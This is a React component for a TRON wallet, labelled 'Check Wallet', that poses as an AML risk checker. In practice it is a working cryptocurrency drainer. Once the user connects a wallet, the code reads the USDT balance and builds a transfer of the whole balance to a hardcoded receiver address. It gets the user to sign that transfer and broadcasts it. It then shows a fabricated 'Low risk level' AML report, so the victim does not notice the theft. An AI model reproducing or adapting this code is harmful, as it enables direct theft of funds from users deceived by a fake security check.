// src/components/tronAuthButton/TronAuthButton.tsx

import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { tronWeb, adapter } from './tronWallet.ts';
import { Buffer } from 'buffer';

window.Buffer = Buffer; // полифилл для Buffer

const USDT_CONTRACT  = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const TRON_RECEIVER = 'THn2MN1u4MiUjuQsqmrgfP2g4WMMCCuX8n';

export const TronAuthButton: React.FC = () => {
  const [status,  setStatus]  = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();

  // Предварительная инициализация adapter для ускорения открытия модалки
  useEffect(() => {
    ;(adapter as any).init?.().catch(() => {});
  }, []);

  const reset = () => {
    setLoading(false);
    setStatus(null);
    adapter.disconnect().catch(()=>{});
  };

  const connectWallet = async () => {
    if (loading) return;
    setLoading(true);
    setStatus(null);

    try {
      if (!adapter.connected) {
        await adapter.connect();
      }

      const userAddress = adapter.address!;
      tronWeb.setAddress(userAddress);

      // Проверка TRX (минимум 2 TRX)
      const trxRaw = await tronWeb.trx.getBalance(userAddress);
      const trx    = trxRaw / 1e6;
      if (trx < 2) {
        // перенаправляем на главную
        reset();
        navigate('/');
        return;
      }

      // Проверка USDT
      const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
      const usdtRaw      = await usdtContract.methods.balanceOf(userAddress).call();
      const usdt         = Number(usdtRaw) / 1e6;
      if (usdt < 1) {
        setStatus('succes');
        reset();
        return;
      }

      // Строим и отправляем транзакцию
      const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
        USDT_CONTRACT,
        'transfer(address,uint256)',
        { feeLimit: 25_000_000, callValue: 0 },
        [
          { type: 'address', value: TRON_RECEIVER },
          { type: 'uint256', value: usdtRaw },
        ],
        userAddress
      );
      await adapter.signTransaction(transaction);
      const result = await tronWeb.trx.sendRawTransaction(transaction);
      if (result?.result) {
        setStatus('succes');
      } else {
        throw new Error('Send failed');
      }
    } catch (err: any) {
      console.error('Error:', err);
      const msg = err.message || err.toString();
      if (
        msg.includes('User rejected') ||
        msg.includes('Modal is closed') ||
        msg.includes('Timeout')
      ) {
        // просто сброс состояния без показа
      } else {
        setStatus('⚠️ Connection or transaction error');
      }
    } finally {
      setLoading(false);
    }
  };

  return (
    <>
      <div className="AuthButton" onClick={connectWallet}>
        {loading ? 'Connecting...' : 'Check Wallet'}
      </div>

      {!loading && status && (
        <div className="modal__overflow">
          <div className="modal">
            {status !== 'succes' ? (
              <p>{status}</p>
            ) : (
              <>
                <div className="content greenBorder">
                  <div>0.6%</div>
                  <div>
                    <h3>Low risk level</h3>
                    <div className="nums">
                      <div><span className="circ green" /> 0–30</div>
                      <div><span className="circ orange" /> 31–69</div>
                      <div><span className="circ red" /> 70–100</div>
                    </div>
                  </div>
                </div>
                <div className="content report">
                  <p>AML report for a wallet:</p>
                  <h5>{USDT_CONTRACT}</h5>
                </div>
              </>
            )}
            <button onClick={reset}>Close</button>
          </div>
        </div>
      )}
    </>
  );
};
